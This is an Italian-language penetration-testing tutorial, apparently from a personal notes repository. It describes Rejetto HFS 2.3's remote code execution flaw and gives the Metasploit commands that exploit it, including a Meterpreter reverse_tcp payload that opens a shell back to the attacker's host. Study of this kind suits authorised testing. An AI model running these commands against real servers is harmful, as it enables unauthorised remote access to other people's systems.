<a href="https://github.com/Gigidotexe/Penetration_Test_notes/blob/main/README.md"> Back </a>
# Exploiting a Vulnerable HTTP File Server (HFS)

Un **HTTP File Server (HFS)** è un tipo di server web progettato appositamente per la **condivisione di file** con utenti remoti. A differenza dei server web tradizionali, il cui scopo principale è **ospitare siti web** o **fornire documenti statici e dinamici** (come HTML, CSS, immagini o script), un HFS è ottimizzato per permettere **il download diretto di file** e l'accesso a directory da parte di utenti collegati alla rete.

---

## Differenze tra HFS e Web Server Standard

Un **server web standard** (come Apache, NGINX o Microsoft IIS) è configurato per fornire contenuti web, gestire richieste HTTP complesse, eseguire codice lato server e integrare funzionalità dinamiche come PHP o ASP.NET.

Un **HTTP File Server**, invece, è semplificato e progettato con un obiettivo primario: **la condivisione rapida e semplice di file**, sia in **rete locale** che su **Internet**. Questo tipo di server permette agli utenti di accedere a documenti condivisi tramite browser, e spesso include funzionalità di navigazione tra directory, download diretto e caricamento (upload) controllato.

---

## Rejetto HFS

Uno dei software più noti per la gestione di HTTP File Server è **Rejetto HFS**. Si tratta di un'applicazione:

- **Gratuita e open-source**.
- Disponibile per **Windows** (ma può essere eseguita anche su Linux tramite Wine).
- Dotata di una **interfaccia grafica semplice** per configurare la condivisione di directory.
- Molto utilizzata per ambienti casalinghi, laboratori, o reti aziendali leggere.

La versione **2.3** di Rejetto HFS contiene una **vulnerabilità nota di tipo Remote Code Execution (RCE)**, che consente a un attaccante remoto di eseguire comandi arbitrari sul sistema target.

---

## La Vulnerabilità di Rejetto HFS 2.3

Nella versione 2.3 di Rejetto HFS è presente una falla che consente, tramite una richiesta HTTP appositamente costruita, di eseguire comandi sul sistema operativo che ospita il server.

Questa vulnerabilità è stata **catalogata e inclusa nel database di Metasploit**, dove è disponibile un exploit pubblico completamente funzionante.

---

## Sfruttamento con Metasploit

Per sfruttare questa vulnerabilità all'interno di un penetration test, è possibile utilizzare il modulo Metasploit:
```bash
use exploit/windows/http/rejetto_hfs_exec
```

Questo modulo sfrutta la falla nella gestione delle richieste HTTP da parte del server vulnerabile per ottenere una **sessione Meterpreter**, o un altro tipo di shell, a seconda del payload selezionato.

Dopo aver caricato il modulo, sarà necessario configurare:
- `RHOST` ⟶ l'IP del server HFS vulnerabile.
- `RPORT` ⟶ la porta su cui è in ascolto (di default 80).
- `PAYLOAD` ⟶ il tipo di payload desiderato (es. `windows/meterpreter/reverse_tcp`).
- `LHOST` e `LPORT` ⟶ l'indirizzo e la porta della macchina attaccante per ricevere la connessione.

Esempio:
```bash
set RHOST 192.168.1.100
set RPORT 80
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run
```

Se il target è vulnerabile, l’attaccante otterrà **accesso remoto** al sistema bersaglio con privilegi dell’utente con cui gira il processo di HFS.

---
